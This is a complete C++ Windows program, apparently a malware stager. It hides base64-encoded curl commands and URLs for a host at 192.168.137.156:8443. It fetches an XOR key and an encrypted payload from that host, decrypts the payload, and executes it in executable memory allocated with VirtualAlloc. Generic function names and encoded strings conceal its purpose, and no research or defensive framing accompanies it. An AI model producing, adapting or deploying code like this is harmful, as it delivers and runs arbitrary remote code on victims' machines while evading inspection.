#include <windows.h>
#include <vector>
#include <string>
#include <sstream>

void fn1(unsigned char* data, size_t sz, unsigned char key) {
    for (size_t i = 0; i < sz; ++i) {
        data[i] ^= key;
    }
}

void fn2(unsigned char* code, size_t sz) {
    void* mem = VirtualAlloc(0, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return;
    memcpy(mem, code, sz);
    ((void(*)())mem)();
}

std::string fn3(const std::string& cmd) {
    char buf[128];
    std::stringstream res;
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "";
    while (fgets(buf, sizeof(buf), pipe) != nullptr) {
        res << buf;
    }
    _pclose(pipe);
    return res.str();
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    std::string v1 = "aHR0cHM6Ly8xOTIuMTY4LjEzNy4xNTY6ODQ0My9waXp6YS50eHQ=";
    std::string v2 = "aHR0cHM6Ly8xOTIuMTY4LjEzNy4xNTY6ODQ0My9mdW4uYmlu";
    std::string v3 = "Y3VybCAtayAtcyA=";
    std::string v4 = "QXV0aG9yaXphdGlvbjogQmVhcmVyIA==";

    auto fn4 = [](const std::string& encoded) -> std::string {
        static const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string decoded;
        std::vector<int> table(256, -1);
        for (int i = 0; i < 64; ++i) table[chars[i]] = i;
        int val = 0, valb = -8;
        for (unsigned char c : encoded) {
            if (table[c] == -1) continue;
            val = (val << 6) + table[c];
            valb += 6;
            if (valb >= 0) {
                decoded.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        return decoded;
    };

    std::string u1 = fn4(v1);
    std::string u2 = fn4(v2);
    std::string u3 = fn4(v3);
    std::string u4 = fn4(v4);

    std::string cmd1 = u3 + " " + u1;
    std::string k1 = fn3(cmd1);
    while (!k1.empty() && (k1.back() == '\n' || k1.back() == '\r' || k1.back() == ' ')) {
        k1.pop_back();
    }
    if (k1.empty()) return 1;

    unsigned char k2 = static_cast<unsigned char>(std::stoi(k1));

    std::string cmd2 = u3 + " -H \"" + u4 + k1 + "\" " + u2;
    std::string data = fn3(cmd2);
    if (data.empty()) return 1;

    std::vector<unsigned char> payload(data.begin(), data.end());

    fn1(payload.data(), payload.size(), k2);

    fn2(payload.data(), payload.size());

    return 0;
}
